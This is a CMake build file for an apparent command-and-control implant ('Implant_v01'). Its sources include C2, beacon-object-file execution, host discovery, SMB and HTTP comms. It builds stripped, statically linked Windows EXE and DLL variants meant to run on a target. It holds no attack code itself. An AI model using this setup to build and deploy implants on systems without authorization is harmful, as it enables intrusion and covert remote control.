# CMakeList.txt : CMake project for Implant_v01
# cmake_minimum_required(VERSION 3.16) - trying for native PCH, aka pre compiled headers, for a speedup
cmake_minimum_required (VERSION 3.16)


project ("Implant_v01")


# ==========================================
# QUICK DEBUG OPTIONS
# ==========================================
option(ENABLE_IMPLANT_LOGS "Enable internal debug logging" OFF)

if(ENABLE_IMPLANT_LOGS)
    add_definitions(-DIMPLANT_DEBUG_LOGS)
    message(STATUS "Internal Logging: ENABLED")
else()
    message(STATUS "Internal Logging: DISABLED")
endif()

# toggle from cli with: cmake -B build -D ENABLE_IMPLANT_LOGS=ON/OFF

# ==========================================
# 1. Output Directory
# ==========================================
# This ensures the .exe ends up in the /output folder inside the container
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "/output")

# ==========================================
# 2. Source Files
# ==========================================

# Core sources
set(SOURCES
    "core/settings.h"
    "protocols/json/json.h"
    "data/msgpack/msgpack.cpp"
    "data/msgpack/msgpack.h"
    "data/transforms/transforms.cpp"
    "data/transforms/transforms.h"
    "tests/test.cpp"
    "tests/test.h"
    "protocols/base64/base64.cpp"
    "protocols/base64/base64.h"
    "comms/comms.h"
    "core/c2.h"
    "core/c2.cpp"
    "core/commandtree.cpp"
    "core/commandtree.h"
    "modules/cd.cpp" 
    "modules/cd.h" 
    "modules/strategy.cpp" 
    "modules/ls.cpp" 
    "modules/files.cpp" 
    "modules/files.h" 
    "data/structs.h"  
    "systems/memstore.h"
    "modules/metadata.cpp" 
    "modules/metadata.h"
    "modules/bof.cpp"
    "modules/bof.h"
    "libs/bof_launcher_api.h"
    "modules/discover.cpp"
    "modules/discover.h"
    "comms/transport.h"
    "defense/winapi.h"
    "comms/smb.h"
    "comms/smb.cpp"
    "protocols/http_wininet/http.cpp"
    "protocols/http_wininet/http.h"
    "_debug/debug.cpp"
)
#add_executable(Implant_v01 ${SOURCES} "modules/discover.cpp" "modules/discover.h" "comms/transport.h"   "defense/winapi.h" "comms/smb.h" "comms/smb.cpp")

add_library(ImplantCore STATIC
    ${SOURCES}
 "systems/childhandler.h" "systems/childhandler.cpp"  "data/uuid7.h" "comms/queues.h")

# note - explicitly public so build targets can see these too
target_include_directories(ImplantCore PUBLIC
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/comms
    ${CMAKE_CURRENT_SOURCE_DIR}/core
    ${CMAKE_CURRENT_SOURCE_DIR}/data
    ${CMAKE_CURRENT_SOURCE_DIR}/defense
    ${CMAKE_CURRENT_SOURCE_DIR}/entrypoints
    ${CMAKE_CURRENT_SOURCE_DIR}/libs
    ${CMAKE_CURRENT_SOURCE_DIR}/modules
    ${CMAKE_CURRENT_SOURCE_DIR}/protocols
    ${CMAKE_CURRENT_SOURCE_DIR}/systems

)

target_precompile_headers(ImplantCore PRIVATE
    <string>
    <vector>
    <map>
    <windows.h>
    <fstream>
    <mutex>
    "protocols/json/json.h"
    "data/msgpack/msgpack.h"
)

# create our EXE:
add_executable(Implant_v01_exe
    entrypoints/exe_main.cpp
 "systems/childhandler.h" "systems/childhandler.cpp"  "data/uuid7.h" "comms/queues.h")
# link against core
target_link_libraries(Implant_v01_exe PRIVATE ImplantCore)

# create our DLL:
add_library(Implant_v01_dll SHARED
    entrypoints/dll_main.cpp
 "systems/childhandler.h" "systems/childhandler.cpp"  "data/uuid7.h" "comms/queues.h")
# link against core
target_link_libraries(Implant_v01_dll PRIVATE ImplantCore)

# ==========================================
# External Libraries (BofRunner)
# ==========================================
add_library(BofRunner STATIC IMPORTED)
set_target_properties(BofRunner PROPERTIES
    IMPORTED_LOCATION "${CMAKE_CURRENT_SOURCE_DIR}/libs/bof_launcher_win_x64.lib"
    # This tells CMake where the .h file is located
    INTERFACE_INCLUDE_DIRECTORIES "${CMAKE_CURRENT_SOURCE_DIR}/libs"
    # trying out unity builds, tldr, puts everything into one file, then compiles, so the compiler doesn't have to 
    # constantly read files. May cause name collisions with global vars.
    UNITY_BUILD ON
)
# ==========================================
# 3. Target Platform Logic (Windows)
# ==========================================
# tells windows.h and winsock2 to stop FUCKING fighting constantly (among other things)
add_compile_definitions(WIN32_LEAN_AND_MEAN)

if(WIN32)
    # Both MSVC and MinGW (Cross-compile) enter here
    
    # Add Windows-specific sources
    #target_sources(Implant_v01 PRIVATE 
    #    "protocols/http_wininet/http.cpp"
    #    "protocols/http_wininet/http.h"
    #)

    target_link_libraries(Implant_v01_exe PRIVATE
        BofRunner # ALWYAS FIRST
        wininet
        iphlpapi
        ws2_32
        crypt32
        ntdll
    )

    target_link_libraries(Implant_v01_dll PRIVATE
        BofRunner
        wininet
        iphlpapi
        ws2_32
        crypt32
        ntdll
    )

    # MSVC Specific (Native Windows Build)
    if(MSVC)

        # Enable Hot Reload (debug only)
        if (POLICY CMP0141)
            cmake_policy(SET CMP0141 NEW)
            set(CMAKE_MSVC_DEBUG_INFORMATION_FORMAT
                "$<IF:$<AND:$<C_COMPILER_ID:MSVC>,$<CXX_COMPILER_ID:MSVC>>,
                $<$<CONFIG:Debug,RelWithDebInfo>:EditAndContinue>,
                $<$<CONFIG:Debug,RelWithDebInfo>:ProgramDatabase>>")
        endif()

        # Force static runtime (/MT instead of /MD)
        foreach(flag_var
            CMAKE_C_FLAGS CMAKE_C_FLAGS_DEBUG CMAKE_C_FLAGS_RELEASE
            CMAKE_CXX_FLAGS CMAKE_CXX_FLAGS_DEBUG CMAKE_CXX_FLAGS_RELEASE)
            string(REPLACE "/MD" "/MT" ${flag_var} "${${flag_var}}")
        endforeach()

        # ==========================================
        # Release optimizations (reduce binary size)
        # ==========================================

        # Compile optimizations
        add_compile_options(
            $<$<CONFIG:Release>:/O2>      # full optimization
            $<$<CONFIG:Release>:/Ob2>     # aggressive inlining
            $<$<CONFIG:Release>:/GL>      # whole program optimization
            $<$<CONFIG:Release>:/DNDEBUG> # remove asserts
        )

        # Linker optimizations
        add_link_options(
            $<$<CONFIG:Release>:/LTCG>            # link time optimization
            $<$<CONFIG:Release>:/OPT:REF>         # remove unused functions
            $<$<CONFIG:Release>:/OPT:ICF>         # fold identical functions
            $<$<CONFIG:Release>:/INCREMENTAL:NO>  # disable incremental linking
        )

    endif()
        
    # MinGW Specific (Cross-Compile on Linux)
    elseif(MINGW)
        # 1. Static Linking
        # Ensures libgcc/libstdc++ are built in, so you don't need DLLs on the target
        target_link_options(Implant_v01_exe  PRIVATE 
            -static 
            -static-libgcc 
            -static-libstdc++
            # trying out LLD(LLVM linker)
            -fuse-ld=lld
        )
        
        target_link_options(Implant_v01_dll PRIVATE
            -static
            -static-libgcc
            -static-libstdc++
            -fuse-ld=lld
        )

        # set some stuff for optimizations
        set(CMAKE_CXX_FLAGS_RELEASE "-Os")
        set(CMAKE_C_FLAGS_RELEASE "-Os")

        # strip 
        set(CMAKE_EXE_LINKER_FLAGS "-s")

        # dead code elim
        # this might knock out those extra funcs in comms... needs testing. 
        #add_compile_options(-ffunction-sections -fdata-sections)
        #add_link_options(-Wl,--gc-sections)

        # notes, can switch to non-iostream/non-std libs for even smaller stuff if I need to. 

    endif()

# ==========================================
# Post-Build Steps
# ==========================================
# Strip the bins if strip command exists
if(CMAKE_STRIP)
    add_custom_command(TARGET Implant_v01_exe POST_BUILD
        COMMAND ${CMAKE_STRIP} $<TARGET_FILE:Implant_v01_exe>
        COMMENT "Stripping executable..."
    )
    
    add_custom_command(TARGET Implant_v01_dll POST_BUILD
        COMMAND ${CMAKE_STRIP} $<TARGET_FILE:Implant_v01_dll>
        COMMENT "Stripping DLL..."
    )
endif()

# ==========================================
# 4. Standard Config
# ==========================================
if (CMAKE_VERSION VERSION_GREATER 3.12)
    # compile all our coponents w c++ 23
    set_property(TARGET ImplantCore PROPERTY CXX_STANDARD 23)
    set_property(TARGET Implant_v01_exe PROPERTY CXX_STANDARD 23)
    set_property(TARGET Implant_v01_dll PROPERTY CXX_STANDARD 23)

endif()

# Note - for visual studio
# Build as release: 
# Open terminal (ctrl+`) 
# Run:
# cmake -S . -B build-release -A x64; cmake --build build-release --config Release
# currently limietd to 64 bit cuz the bof launcher is only compiled in 64 bit.
# add 32 bit later